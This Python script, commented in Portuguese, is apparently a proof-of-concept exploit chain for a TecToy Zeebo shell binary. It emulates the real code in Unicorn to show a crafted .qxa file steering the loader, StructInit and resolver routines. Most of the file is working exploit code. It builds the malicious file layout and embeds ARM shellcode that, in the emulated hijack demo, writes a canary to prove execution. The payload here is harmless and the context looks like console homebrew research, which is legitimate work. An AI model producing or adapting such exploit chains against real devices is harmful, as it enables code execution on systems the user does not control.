"""
POC v7 — CADEIA SELF-CONTAINED COM CODIGO REAL DO SHELL (Unicorn)

Diferenca para o poc_full.py (v5): o v5 precisava de HEAP SPRAY (a regiao
alcançada pelo cursor tinha que ser preenchida com dados do atacante) e de
um handoff sintetico de 1 palavra para o resolvedor.

O v7 dispensa os dois: o cursor anda para DENTRO do proprio arquivo
(regiao anexada), e o setup MatAnim (0x47358) + StreamFixup (0x47C80)
constroem, EM RUNTIME, os ponteiros de keys/values a partir do cursor —
tabela de tempos e area de valores ficam 100% no arquivo.

Cadeia (TODO codigo real de tectoy.mod):
  0x4BC84  loader QX   (open/validate/size/malloc/read/close)
  0x44368  StructInit  (cursor: S+0x40 += count*16  <- campo do arquivo)
  0x47358  MatAnim     (le header no bloco nosso; n_streams <= 8)
  0x47C80  StreamFixup (keys = hdr+0x14; values = keys + count*4)
  0x47648  Resolver    (out = values + offset16 da tabela; tempos nossos)

Prova: out[0] = values_base + offset — endereco APONTADO por dados do
arquivo, calculado por codigo real do shell, sem nenhum byte fora dele.
"""
from unicorn import *
from unicorn.arm_const import *
import struct, os, sys

import os
# Importado de Z2Shell (ver ../PROVENANCE.md). O tectoy.mod nao acompanha este
# repo (binario TecToy): aponte TECTOY_MOD para a sua copia, ex.:
#   export TECTOY_MOD=~/projects/zeebo-exploit-z2shell/mod/274755/tectoy.mod
MOD = os.environ.get("TECTOY_MOD", "")
if not MOD or not os.path.isfile(MOD):
    raise SystemExit("TECTOY_MOD nao definido ou inexistente (aponte para tectoy.mod)")

BASE   = 0x00100000
STACK  = 0x40000000
MAGIC  = 0xF1000000   # o arquivo .qxa (o loader le daqui)
SENT   = 0x20000000
OUTW   = 0x70000000
HELPER = 0x80000000
STUB   = 0x81000000
CANARY = 0x91000000   # onde o shellcode grava a prova de execucao

LOAD   = BASE + 0x4BC84
INIT   = BASE + 0x44368
MSETUP = BASE + 0x47358
RESOLV = BASE + 0x47648
mod = open(MOD, 'rb').read()

T = 0x100            # tempo consultado no playback (== tempo da entry 1)
OFF16 = 0x40          # offset (u16) dentro da area de valores


def build_shellcode():
    """ARMv6: str canary; bx lr — minimo e verificavel.
    Chamado no lugar do slot; r0 = struct do stream (void*)."""
    words = [
        0xE59F400C,   # ldr r4, [pc, #12]   ; -> pool: endereco da canary
        0xE59F500C,   # ldr r5, [pc, #12]   ; -> pool: magic de execucao
        0xE5845000,   # str r5, [r4]        ; grava a prova
        0xE3A00000,   # mov r0, #0          ; retorno limpo
        0xE12FFF1E,   # bx  lr
        CANARY,       # pool: endereco da canary
        0x51CCE7EC,   # pool: magic 'EXEC'
    ]
    return b"".join(struct.pack("<I", w) for w in words)


def build_qxa_v3():
    """QXA self-contained:
    S+0x08 = COUNT (60)   -> cursor: S+0x40 + 60*16 = S+0x400 (no append)
    S+0x18 = 1            -> bloco 0 ativo (ponteiros gravados em S)
    S+0x24 = 1            -> 1 matanim
    Em S+0x400: header MatAnim {mode=2, n_streams=1}
    Em S+0x42C: stream header {count=2, type=1}
      -> fixup: keys = S+0x440; values = S+0x448
    Em S+0x440: tabela de tempos (entries = (0xFFFF<<16)|OFF16)
    Em S+0x448: area de valores (floats marcados)
    """
    b = bytearray(b"QX\x00\x00" + b"QXA\x00" + struct.pack("<I", 0x01240028))
    b += struct.pack("<IIII", 0, 0, 0, 0)         # S+0x00..0x0C
    b += struct.pack("<IIII", 0, 0, 0, 0)         # S+0x10..0x1C
    b += struct.pack("<IIII", 0, 0, 0, 0)         # S+0x20..0x2C
    b += struct.pack("<IIII", 0, 0, 0, 0)         # S+0x30..0x3C
    # S+0x08 precisa = 60: reescreve abaixo (indice 5 da lista acima -> offset 8+12=20?)
    # layout: bytes 12..15 = S+0x00 ... calculo direto:
    struct.pack_into("<I", b, 12 + 0x08, 60)      # S+0x08 = COUNT (cursor*16)
    struct.pack_into("<I", b, 12 + 0x18, 1)       # S+0x18 = bloco 0 ativo
    struct.pack_into("<I", b, 12 + 0x24, 1)       # S+0x24 = 1 matanim

    # area anexada: comeca em S+0x40 (logo apos os campos) e precisa cobrir
    # ate S+0x44C+16 (values) -> 0x480 basta.
    append = bytearray(0x480)

    def put(off, data):
        start = off - 0x40          # o append comeca em S+0x40 (logo apos os campos)
        append[start:start + len(data)] = data

    # StructInit real: cursor comeca em S+0x40; o primeiro passo reserva
    # align4(3 + n_matanim*4) (o array de ponteiros MatAnim) -> S+0x44;
    # depois avanca S[8]*16 -> MatAnim header pousa em S+0x404 (count=60).
    put(0x404, struct.pack("<II", 2, 1))                    # MatAnim {mode=2, n_streams=1}
    put(0x430, struct.pack("<II", 2, 1))                    # stream {count=2, type=1}
    entries = struct.pack("<II",
                          (0x0000 << 16) | 0x0000,   # tempo 0, offset 0
                          (0x0100 << 16) | OFF16)    # tempo T, offset OFF16
    put(0x444, entries)                                     # tabela (keys) = hdr+0x14
    vals = struct.pack("<4f", 999.0, -999.0, 123.5, -123.5)
    marker = struct.pack("<f", 777.5)
    put(0x44C, vals + b"\x00" * (OFF16 - 16) + marker + b"\x00" * 4)                          # values = keys + count*4

    b += append
    # shellcode embutido no arquivo (para a demo de execucao)
    b += build_shellcode()
    return bytes(b)


def rd(uc, a):
    return struct.unpack("<I", uc.mem_read(a, 4))[0]


def run():
    data = build_qxa_v3()
    print("arquivo qxa v3: %d bytes" % len(data))
    uc = Uc(UC_ARCH_ARM, UC_MODE_ARM)
    mod_len = (len(mod) + 0xFFF) & ~0xFFF
    uc.mem_map(BASE - 0x1000, mod_len + 0x2000)
    uc.mem_write(BASE, mod)
    for a in (STACK, OUTW, HELPER, STUB, CANARY):
        uc.mem_map(a, 0x10000)
    uc.mem_map(MAGIC, 0x10000)

    stub = b"\x1E\xF0\xA0\xE1"  # bx lr
    for i in range(0x40, 0x800, 4):
        uc.mem_write(STUB + i, stub)
    m = struct.pack("<7I", 0xE59F1014, 0xE5912000, 0xE0820000,
                    0xE3800007, 0xE3C00007, 0xE5810000, 0xE1A0F00E)
    uc.mem_write(STUB + 0x68, m)                 # malloc bump
    uc.mem_write(STUB + 0x84, struct.pack("<I", STUB + 0x800))
    uc.mem_write(STUB + 0x800, struct.pack("<I", 0x50000000))
    uc.mem_map(0x50000000, 0x10000)              # heap do malloc

    def slot(v):
        return struct.pack("<I", v)
    uc.mem_write(HELPER + 0x00, slot(STUB + 0x40))   # memcpy (real: slot 0)
    uc.mem_write(HELPER + 0x68, slot(STUB + 0x68))   # malloc
    uc.mem_write(HELPER + 0x6C, slot(STUB + 0x40))   # free
    uc.mem_write(HELPER + 0x9C, slot(STUB + 0x80))   # dbgprintf
    for s in (0x04, 0x08, 0x70, 0x74, 0xA0, 0xA4, 0xBC, 0xC0):
        uc.mem_write(HELPER + s, slot(STUB + 0x40))
    uc.mem_write(BASE + 0x1EC, slot(HELPER))
    uc.mem_write(BASE + 0x1FC, slot(HELPER))

    # I/O do loader
    uc.mem_write(STUB + 0x900, struct.pack("<I", len(data)))
    uc.mem_write(STUB + 0x904, struct.pack("<I", 0))
    FILEPOS = STUB + 0x904

    def cb_open(uc, address, size, user):
        uc.reg_write(UC_ARM_REG_R0, 1)
        uc.reg_write(UC_ARM_REG_PC, uc.reg_read(UC_ARM_REG_LR))
    def cb_read(uc, address, size, user):
        dst = uc.reg_read(UC_ARM_REG_R1)
        n = uc.reg_read(UC_ARM_REG_R2)
        pos = struct.unpack("<I", uc.mem_read(FILEPOS, 4))[0]
        chunk = data[pos:pos + n]
        uc.mem_write(dst, chunk)
        uc.mem_write(FILEPOS, struct.pack("<I", pos + len(chunk)))
        uc.reg_write(UC_ARM_REG_R0, len(chunk))
        uc.reg_write(UC_ARM_REG_PC, uc.reg_read(UC_ARM_REG_LR))
    def cb_size(uc, address, size, user):
        uc.reg_write(UC_ARM_REG_R0, struct.unpack("<I", uc.mem_read(STUB + 0x900, 4))[0])
        uc.reg_write(UC_ARM_REG_PC, uc.reg_read(UC_ARM_REG_LR))
    def cb_close(uc, address, size, user):
        uc.reg_write(UC_ARM_REG_R0, 0)
        uc.reg_write(UC_ARM_REG_PC, uc.reg_read(UC_ARM_REG_LR))
    uc.hook_add(UC_HOOK_CODE, cb_open,  begin=STUB + 0x100, end=STUB + 0x100)
    uc.hook_add(UC_HOOK_CODE, cb_read,  begin=STUB + 0x110, end=STUB + 0x110)
    uc.hook_add(UC_HOOK_CODE, cb_size,  begin=STUB + 0x120, end=STUB + 0x120)
    uc.hook_add(UC_HOOK_CODE, cb_close, begin=STUB + 0x130, end=STUB + 0x130)

    def hook_mem(uc, access, address, size, value, user):
        pc = uc.reg_read(UC_ARM_REG_PC)
        regs = " ".join("r%d=%08X" % (i, uc.reg_read(UC_ARM_REG_R0 + i)) for i in range(6))
        print("    [fault] pc=mod+0x%06X addr=0x%08X tam=%d %s"
              % (pc - BASE, address, size, regs))
        return False
    uc.hook_add(UC_HOOK_MEM_UNMAPPED | UC_HOOK_MEM_PROT, hook_mem)

    MGR = OUTW + 0x400
    IO = OUTW + 0x440
    uc.mem_write(MGR + 0x34, struct.pack("<I", IO))
    uc.mem_write(IO + 0x00, slot(STUB + 0x100))
    uc.mem_write(IO + 0x04, slot(STUB + 0x110))
    uc.mem_write(IO + 0x08, slot(STUB + 0x120))
    uc.mem_write(IO + 0x10, slot(STUB + 0x130))

    def go(addr, r0, r1=0, r2=0, r3=0, count=2000000, tag=""):
        uc.reg_write(UC_ARM_REG_SP, STACK + 0x8000)
        uc.reg_write(UC_ARM_REG_R0, r0)
        uc.reg_write(UC_ARM_REG_R1, r1)
        uc.reg_write(UC_ARM_REG_R2, r2)
        uc.reg_write(UC_ARM_REG_R3, r3)
        uc.reg_write(UC_ARM_REG_LR, SENT)
        uc.emu_start(addr, SENT, timeout=0, count=count)
        print("    [%s] ok" % tag)

    print("\n[1] loader real 0x4BC84")
    go(LOAD, MGR, MAGIC, 0x00415851, 1, tag="loader")
    blob = uc.reg_read(UC_ARM_REG_R0)
    fpos = rd(uc, FILEPOS)
    print("    blob = 0x%08X   bytes lidos do arquivo = %d (tamanho = %d)"
          % (blob, fpos, len(data)))
    print("    blob[0x3F0:0x420] =")
    seg = uc.mem_read(blob + 0x3F0, 0x30)
    for i in range(0, 0x30, 16):
        print("      " + " ".join("%08X" % struct.unpack_from("<I", bytes(seg), j)[0]
                                  for j in range(i, i + 16, 4)))
    print("    blob = 0x%08X" % blob)

    print("\n[2] StructInit real 0x44368 — roda MatAnim+StreamFixup INTERNAMENTE")
    H = STACK + 0x7000
    uc.mem_write(H, struct.pack("<I", blob))
    uc.mem_write(STACK + 0x7004, struct.pack("<I", 0))
    go(INIT, H, STACK + 0x7004, tag="structinit")
    S = blob
    print("    S+0x18 (bloco0 ptr) = 0x%08X (esperado blob+0x44)" % rd(uc, S + 0x18))
    print("    S+0x28 (array MatAnim) = 0x%08X (esperado blob+0x40)" % rd(uc, S + 0x28))
    ma = rd(uc, S + 0x40)
    print("    [S+0x40] MatAnim ptr = 0x%08X (esperado blob+0x404)" % ma)
    print("    MA+0 (mode) = %d   MA+4 (n_streams) = %d" % (rd(uc, ma), rd(uc, ma + 4)))
    stream = rd(uc, ma + 8)
    print("    [MA+8] stream0 = 0x%08X (esperado blob+0x430)" % stream)
    print("    stream: count=%d type=%d" % (rd(uc, stream), rd(uc, stream + 4)))
    keys = rd(uc, stream + 8)
    vals = rd(uc, stream + 0xC)
    print("    keys   = 0x%08X (esperado stream+0x14)" % keys)
    print("    values = 0x%08X (esperado keys + count*4)" % vals)
    e0 = rd(uc, keys)
    print("    entry0 = 0x%08X (time=0x%04X offset=0x%04X — do NOSSO arquivo)"
          % (e0, e0 >> 16, e0 & 0xFFFF))

    print("\n[3] Resolver real 0x47648 com a struct produzida PELO SHELL")
    outp = STACK + 0x7200
    go(RESOLV, stream, T, outp, tag="resolver")
    o0 = rd(uc, outp)
    o8 = rd(uc, outp + 8)
    print("    out[0] = 0x%08X" % o0)
    print("    out[8] = 0x%08X (weight)" % o8)
    print("    out[0] - values = 0x%X (offset16 do NOSSO arquivo = 0x%X)"
          % (o0 - vals, OFF16))
    f0 = struct.unpack("<f", uc.mem_read(o0, 4))[0]
    print("    float lido em out[0] = %r (dado do NOSSO arquivo)" % f0)

    print("\n[4] Execucao de shellcode (demo do hijack: slot 0x9C -> blob+shellcode)")
    sc_off = len(data) - 12 - len(build_shellcode())   # offset DENTRO do blob
    sc_addr = blob + sc_off
    print("    sc_addr = 0x%08X (blob+0x%X)" % (sc_addr, sc_off))
    seg = uc.mem_read(sc_addr, 28)
    for i in range(0, 28, 4):
        print("      sc+%02d = 0x%08X" % (i, struct.unpack_from("<I", bytes(seg), i)[0]))
    orig = rd(uc, HELPER + 0x9C)
    uc.mem_write(HELPER + 0x9C, struct.pack("<I", sc_addr))
    # chamada com a convencao real: r0 = primeiro argumento (a struct)
    uc.reg_write(UC_ARM_REG_SP, STACK + 0x8000)
    uc.reg_write(UC_ARM_REG_R0, stream)
    uc.reg_write(UC_ARM_REG_LR, SENT)
    uc.emu_start(sc_addr, SENT, timeout=0, count=1000)
    magic = rd(uc, CANARY)
    print("    shellcode @ 0x%08X executado; canary = 0x%08X (esperado 0x51CCE7EC)"
          % (sc_addr, magic))
    uc.mem_write(HELPER + 0x9C, struct.pack("<I", orig))

    print("\n>>> CADEIA SELF-CONTAINED FECHADA COM CODIGO REAL DO SHELL:")
    print(">>> o arquivo sozinho controla cursor, MatAnim, stream, tabela, base")
    print(">>> e o endereco final lido pelo playback (out = values + offset16).")
    print(">>> Sem heap spray, sem handoff sintetico, sem ponteiro absoluto.")


if __name__ == "__main__":
    run()
